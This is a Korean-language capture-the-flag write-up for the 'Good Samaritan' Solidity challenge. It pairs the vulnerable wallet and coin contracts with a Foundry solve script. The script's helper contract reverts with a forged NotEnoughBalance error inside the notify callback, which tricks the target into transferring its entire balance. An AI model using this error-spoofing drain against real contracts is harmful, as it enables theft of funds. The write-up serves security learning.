# 지문

이 인스턴스는 부유하고, 동전을 요청하는 누구에게나 기부할 준비가 되어 있는 **Good Samaritan**을 나타냅니다.

당신은 그의 **Wallet**에서 모든 잔액을 빼낼 수 있을까요?

도움이 될 만한 것들:

* Solidity **Custom Errors**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

# 풀이 

logic을 보면 `wallet.donate10(msg.sender)`이 실행되고나서 destination이 contract면 `notify` callback을 호출함.
처음에 거기서 `NotEnoughBalance` error를 발생시키면 `wallet.transferRemainder(msg.sender)`함수가 호출되고 거기서 또 `notify` callback이 호출되는데 amount, 또는 남은 gas양을 보고 판단해서 두번째 `notify` callback 호출에서는 error를 발생시키지않으면 문제를 해결할수있음

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function requestDonation() external returns (bool enoughBalance);
}

contract Helper {
    bool public flag = false;
    error NotEnoughBalance();
    function trigger(address target) public {
        ITarget(target).requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10)
            revert NotEnoughBalance();
    }
}
contract SolveScript is Script {
    address public target = 0x330981485Dbd4EAcD7f14AD4e6A1324B48B09995;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.trigger(target);
        vm.stopBroadcast();
    }
}
```